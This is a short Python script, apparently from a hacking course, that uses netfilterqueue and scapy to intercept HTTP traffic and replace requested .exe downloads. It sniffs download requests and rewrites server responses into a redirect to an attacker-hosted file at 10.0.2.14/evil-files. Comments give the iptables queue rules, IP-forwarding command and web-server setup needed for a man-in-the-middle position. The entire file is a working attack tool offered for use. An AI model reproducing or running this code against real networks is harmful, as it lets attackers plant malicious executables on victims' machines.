#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

# <<OTHER MACHINE>> iptables -I FORWARD -j NFQUEUE --queue-num 0
# <<Same MACHINE>>  iptables -I OUTPUT -j NFQUEUE --queue-num 0
# <<Same MACHINE>>  iptables -I INPUT -j NFQUEUE --queue-num 0
# <<AFTER DONE>>    iptables --flush
# <<GET IP>>        ping -c 1 www.website.com
# <<WEB SERVER>>    service apache2 start
# <<IP forwarding>> echo 1 > /proc/sys/net/ipv4/ip_forward

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 10000:
            if ".exe" in scapy_packet[scapy.Raw].load and "10.0.2.14" not in scapy_packet[scapy.Raw].load:
                print("[+] Download Request.......")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 10000:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file..........")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.14/evil-files/test.txt\n\n")

                packet.set_payload(str(modified_packet))

    packet.accept()



queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()